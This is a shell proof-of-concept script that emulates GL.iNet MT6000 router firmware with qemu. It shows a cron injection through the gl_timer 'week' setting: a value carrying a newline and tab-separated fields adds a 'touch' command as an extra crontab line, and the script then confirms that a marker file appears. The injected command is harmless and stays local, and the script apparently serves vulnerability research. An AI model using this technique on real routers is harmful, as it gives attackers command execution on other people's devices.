#!/bin/sh
set -eu

ROOT=${ROOT:-/mnt/e/competition/new_project_for_find_bug/analysis/GL.iNet/runtime_rootfs/GL-MT6000}
TMP=${TMP:-/tmp/glinet_timer_uci_etc}
MARKER=${MARKER:-/tmp/glinet_ui_timer_pwn}

rm -rf "$TMP"
mkdir -p "$TMP/config"
cp "$ROOT/etc/config/gl_timer" "$TMP/config/gl_timer"

qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" set gl_timer.langs.enable=1
qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" set gl_timer.langs.hour='0'
qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" set gl_timer.langs.min='0'
payload=$(printf 'gl_timer.langs.week=1\n0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t%s\t#' "$MARKER")
qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" set "$payload"
qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" commit gl_timer
echo '--- uci get week ---'
qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" -q get gl_timer.langs.week | sed -n l
echo '--- config langs section ---'
sed -n "/config timer 'langs'/,+8l" "$TMP/config/gl_timer"

week=$(qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" -q get gl_timer.langs.week | sed 's/ /,/g')
hour=$(qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" -q get gl_timer.langs.hour)
min=$(qemu-aarch64 -L "$ROOT" "$ROOT/sbin/uci" -c "$TMP/config" -q get gl_timer.langs.min)
mkdir -p /tmp/gl_crontabs/crontabs.d
rm -f /tmp/gl_crontabs/crontabs.d/langs /tmp/gl_crontabs/root "$MARKER"
echo "$min $hour * * $week gl_timer_control_langs 1 $week $hour $min" >> /tmp/gl_crontabs/crontabs.d/langs
cat /tmp/gl_crontabs/crontabs.d/langs > /tmp/gl_crontabs/root
echo '--- generated cron ---'
sed -n l /tmp/gl_crontabs/root
echo '--- execute injected cron command line as cron would ---'
sh -n /tmp/gl_crontabs/root >/dev/null 2>&1 || true
sed -n '2p' /tmp/gl_crontabs/root | awk '{$1=$2=$3=$4=$5=""; sub(/^[ \t]+/, ""); print}' | sh
if [ -f "$MARKER" ]; then
  echo "MARKER_CREATED=$MARKER"
  rm -f "$MARKER"
else
  echo "MARKER_NOT_CREATED=$MARKER"
  exit 1
fi
